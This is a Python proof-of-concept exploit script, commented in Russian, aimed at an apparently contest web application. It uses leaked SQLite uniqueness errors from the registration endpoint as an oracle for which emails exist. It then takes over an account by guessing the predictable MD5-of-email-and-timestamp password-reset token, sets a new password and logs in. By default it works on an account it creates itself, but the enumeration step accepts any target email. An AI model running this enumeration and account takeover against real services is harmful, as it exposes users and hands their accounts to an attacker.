# -*- coding: utf-8 -*-
"""Регистрация отдаёт текст SQLite при занятом email.
Дальше тот же адрес берётся предсказуемым MD5-токеном сброса.

По умолчанию жертва — учётка, которую создаёт сам скрипт.
Чужой ящик без смены пароля: python 02_email_oracle.py --email alice@contest.ru --no-reset

    python 02_email_oracle.py
"""
import hashlib
import time

from _http import Client, parser


def reset_password(client: Client, email: str, new_password: str) -> str:
    t0 = int(time.time())
    status, _, blob = client.call("POST", "/api/users/reset", body={"email": email})
    t1 = int(time.time())
    if status != 200:
        raise SystemExit(f"сброс не принят: {status} {blob[:200]!r}")
    for ts in range(t0 - 3, t1 + 5):
        token = hashlib.md5(f"{email}:{ts}".encode()).hexdigest()
        status, _, _ = client.call(
            "POST",
            "/api/users/reset/confirm",
            body={"email": email, "token": token, "password": new_password},
        )
        if status == 200:
            return token
    raise SystemExit("токен сброса не подошёл")


def main():
    p = parser("Оракул email и сброс пароля")
    p.add_argument("--email", default="")
    p.add_argument("--no-reset", action="store_true")
    args = p.parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]

    if args.email:
        email = args.email
    else:
        email = f"oracle{stamp}@poc.local"
        client.register(f"oracle{stamp}", email, "Passw0rd!oracle")

    status, data, blob = client.call(
        "POST",
        "/api/users",
        body={"user": {"username": f"dup{stamp}", "email": email, "password": "Passw0rd!dupmail"}},
    )
    text = blob.decode("utf-8", "replace")
    if status != 422 or "UNIQUE constraint failed: user_models.email" not in text:
        raise SystemExit(f"оракул не сработал: {status} {text[:300]!r}")
    print(f"OK занятый {email}: {text}")

    fresh = f"free{stamp}@poc.local"
    status, _, _ = client.call(
        "POST",
        "/api/users",
        body={"user": {"username": f"free{stamp}", "email": fresh, "password": "Passw0rd!free"}},
    )
    if status not in (200, 201):
        raise SystemExit(f"свободный ящик не принят: {status}")
    print(f"OK свободный {fresh} зарегистрирован, это другой ответ")

    if args.no_reset:
        return
    if args.email:
        raise SystemExit("для чужого ящика добавьте осознанно сброс отдельным запуском без --no-reset только на своей учётки")

    new_password = "TempPass!oracle"
    token = reset_password(client, email, new_password)
    status, logged, blob = client.call(
        "POST",
        "/api/users/login",
        body={"user": {"email": email, "password": new_password}},
    )
    if status != 200 or logged["user"]["email"] != email:
        raise SystemExit(f"после сброса вход не удался: {status} {blob[:200]!r}")
    print(f"OK сброс {email} token={token}, вход с новым паролем")


if __name__ == "__main__":
    main()
